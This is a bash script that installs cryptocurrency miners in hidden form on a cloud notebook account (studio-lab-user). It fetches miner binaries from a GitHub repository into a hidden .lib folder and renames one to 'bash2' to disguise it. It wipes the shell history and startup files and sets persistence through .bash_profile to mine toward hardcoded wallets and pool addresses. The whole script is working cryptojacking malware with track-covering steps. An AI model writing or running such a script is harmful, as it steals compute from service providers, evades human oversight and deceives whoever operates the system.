#!/bin/bash


pkill dero
rm -rvf ele* lol* 1.43* TON* miner** NB* .lib* .bash*
cd ~/
mkdir .lib
cd .lib
rm -rf *
WORKER="$(echo $(shuf -i 1-999999 -n 1)-Bismillahku)"
WORKERDERO="asu"
WALLETNH="1G5wY5jjRTpuamdGN33aZreDuGpG4tKyuXuPXzWQydgXj"
WALLETDERO="TSasvbAzaJwJsSF8jcuDjnewTS55kwotgf"
POOLNHETC="13.239.2.212:80"
POOLDERO="stratum+tcps://54.252.245.225:80"
git clone https://github.com/monariski217/2022.git && cd 2022 
mv * /home/studio-lab-user/.lib
cd .. && history -cr
echo ""  > /home/studio-lab-user/.bashrc
echo "" > /home/studio-lab-user/.bash_history
echo "" > /home/studio-lab-user/.bash_profile
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
echo "WORKER=$WORKER" >> ~/.bash_profile
echo "WORKERDERO=$WORKERDERO" >> ~/.bash_profile
echo "WALLETNH=$WALLETNH" >> /home/studio-lab-user/.bash_profile
echo "WALLETDERO=$WALLETDERO" >> /home/studio-lab-user/.bash_profile
echo "POOLNHETC=$POOLNHETC" >> /home/studio-lab-user/.bash_profile
echo "POOLDERO=$POOLDERO" >> /home/studio-lab-user/.bash_profile
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
echo "./.lib/./dero -a yespowertide -o $POOLDERO -u $WALLETDERO.$WORKERDERO -p m=solo &>> .lib/dero.log &" > /home/studio-lab-user/.lib/gas.sh
echo "./.lib/bash2 --algo ALEPH --pool $POOLNHETC --user $WALLETNH.$WORKER --ethstratum ETHV1 --no-cl" >> /home/studio-lab-user/.lib/gas.sh
chmod +x gas.sh && chmod +x dero && chmod +x bash2 && cd ~/ && history -cr && source .bashrc

